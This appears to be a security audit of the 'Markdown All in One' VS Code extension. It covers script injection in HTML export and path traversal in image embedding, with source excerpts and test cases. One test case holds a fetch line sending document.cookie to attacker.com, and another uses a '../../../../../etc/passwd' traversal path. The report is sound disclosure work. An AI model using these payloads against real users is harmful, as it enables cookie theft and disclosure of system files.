# VULNERABILITIES

## 1. Remote Code Execution Through HTML Export Feature

### Vulnerability Name
Command Injection via HTML Export Script Inclusion

### Description
The Markdown All in One extension contains a severe vulnerability in its HTML export functionality (`print.ts`). When exporting a markdown document to HTML, the extension reads JavaScript files from all installed VS Code extensions that have markdown contributions and directly embeds their contents into the exported HTML file with no sanitization.

Steps to trigger:
1. An attacker creates a malicious repository with a markdown file
2. The repository also contains or references a malicious VS Code extension with markdown contributions
3. When a victim opens the repository and uses the "Print to HTML" feature on the markdown file
4. The extension includes JavaScript from the malicious extension directly in the output HTML
5. When the victim opens the exported HTML file, the malicious code executes in their browser

### Impact
This vulnerability allows for remote code execution in the context of the victim's browser. The attacker can execute arbitrary JavaScript code when the victim opens the exported HTML file, potentially leading to data exfiltration, cookie theft, or further exploitation.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
There is a blacklist of extensions whose scripts should not be included (`Extension_Blacklist` in `markdownExtensions.ts`), but this is not sufficient as it only excludes a few known extensions.

### Missing Mitigations
1. The extension should sanitize or isolate scripts before including them in the HTML output
2. Implement a proper Content Security Policy for the generated HTML
3. Add a user warning when including scripts from extensions
4. Make script inclusion opt-in rather than default behavior

### Preconditions
1. Victim must have the Markdown All in One extension installed
2. Victim must have a malicious extension installed that provides markdown contributions
3. Victim must export a markdown file to HTML using the extension
4. Victim must open the exported HTML file

### Source Code Analysis
The vulnerability exists in `print.ts` within the `getPreviewExtensionScripts()` function:

```typescript
async function getPreviewExtensionScripts() {
    var result = "";
    for (const contribute of mdEngine.contributionsProvider.contributions) {
        if (!contribute.previewScripts || !contribute.previewScripts.length) {
            continue;
        }
        for (const scriptFile of contribute.previewScripts) {
            result += `<script async type="text/javascript">\n/* From extension ${contribute.extensionId} */\n`;
            try {
                result += await fs.promises.readFile(scriptFile.fsPath, { encoding: "utf8" });
            } catch (error) {
                result += "/* Error */";
            }
            result += `\n</script>\n`;
        }
    }
    return result;
}
```

This function reads JavaScript files from extension contributions and directly adds them as inline script tags in the HTML output. The `mdEngine.contributionsProvider.contributions` comes from `markdownExtensions.ts` which collects contributions from all installed extensions:

```typescript
public get contributions() {
    if (!this._cachedContributions) {
        this._cachedContributions = vscode.extensions.all.reduce<IMarkdownContribution[]>((result, extension) => {
            if (Extension_Blacklist.has(extension.id)) {
                return result;
            }
            // Process extension contributions...
        }, []);
    }
    return this._cachedContributions;
}
```

The extension scripts are then embedded in the HTML in the `print()` function:
```typescript
html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>${title ? encodeHTML(title) : ''}</title>
    ${extensionStyles}
    ${getStyles(doc.uri, hasMath, includeVscodeStyles)}
</head>
<body class="vscode-body ${themeClass}">
    ${body}
    ${hasMath ? '<script async src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script>' : ''}
    ${extensionScripts}
</body>
</html>`;
```

### Security Test Case
1. Create a malicious VS Code extension that adds markdown contributions with dangerous JavaScript code:
   ```javascript
   {
     "contributes": {
       "markdown.previewScripts": ["malicious.js"]
     }
   }
   ```
   Where `malicious.js` contains:
   ```javascript
   fetch('https://attacker.com/steal?data=' + document.cookie);
   ```

2. Install this extension in the victim's VS Code.

3. Create a simple markdown file:
   ```markdown
   # Test Document
   This is a test.
   ```

4. Export the markdown file to HTML using the "Print to HTML" command.

5. Open the exported HTML file in a browser. The malicious JavaScript will execute, sending the victim's cookies to the attacker's server.

## 2. Path Traversal Leading to File Content Disclosure

### Vulnerability Name
Path Traversal in Image Processing During HTML Export

### Description
When exporting markdown to HTML, the Markdown All in One extension converts image references to base64 data URIs or absolute file paths. The path handling in `relToAbsPath()` function followed by direct file reading allows for directory traversal attacks, potentially enabling an attacker to read arbitrary files on the victim's filesystem.

Steps to trigger:
1. Attacker creates a markdown file with image references containing path traversal sequences
2. Victim opens the malicious markdown file in VS Code
3. Victim uses the "Print to HTML" feature
4. The extension attempts to read files at the traversed path and embeds their contents

### Impact
This vulnerability allows an attacker to read arbitrary files on the victim's system that the VS Code process has access to. This could include sensitive configuration files, credentials, or other personal data.

### Vulnerability Rank
High

### Currently Implemented Mitigations
There is minimal path sanitization applied, but it's insufficient to prevent path traversal attacks.

### Missing Mitigations
1. Proper validation and sanitization of image paths to prevent path traversal
2. Restrict file reading to the workspace or document directory
3. Add a user prompt or warning before converting external file references

### Preconditions
1. Victim must have the Markdown All in One extension installed
2. Victim must open a malicious markdown file with path traversal in image references
3. Victim must use the "Print to HTML" feature on this file
4. The "Convert image paths to data URLs" option must be enabled (default)

### Source Code Analysis
The vulnerability exists in the image processing logic in `print.ts`:

```typescript
body = body.replace(imgTagRegex, function (_, p1, p2, p3) {
    if (p2.startsWith('http') || p2.startsWith('data:')) {
        return _;
    }

    const imgSrc = relToAbsPath(doc.uri, p2);
    try {
        let imgExt = path.extname(imgSrc).slice(1);
        if (imgExt === "jpg") {
            imgExt = "jpeg";
        } else if (imgExt === "svg") {
            imgExt += "+xml";
        }
        const file = fs.readFileSync(imgSrc.replace(/%20/g, '\ ')).toString('base64');
        return `${p1}data:image/${imgExt};base64,${file}${p3}`;
    } catch (e) {
        window.showWarningMessage(localize("ui.general.messageUnableToReadFile", imgSrc) + ` ${localize("ui.exporting.messageRevertingToImagePaths")} (${doc.fileName})`);
    }
    // ...
});
```

The `relToAbsPath()` function doesn't adequately protect against path traversal:

```typescript
function relToAbsPath(resource: Uri, href: string): string {
    if (!href || href.startsWith('http') || path.isAbsolute(href)) {
        return href;
    }

    // Otherwise look relative to the markdown file
    return path.join(path.dirname(resource.fsPath), href);
}
```

While `path.join()` does normalize paths, it doesn't prevent traversal outside the document's directory. The function then uses `fs.readFileSync()` to read the file at that path, which will access any file the VS Code process has permission to read.

### Security Test Case
1. Create a malicious markdown file with an image reference that uses path traversal:
   ```markdown
   # Malicious Document
   
   Look at this image:
   ![sensitive file](../../../../../etc/passwd)
   ```

2. Open this file in VS Code with the Markdown All in One extension installed.

3. Use the "Print to HTML" command to export the document.

4. Examine the exported HTML file. If the vulnerability exists, it will contain a base64-encoded version of the targeted file (/etc/passwd in this example) within an img tag.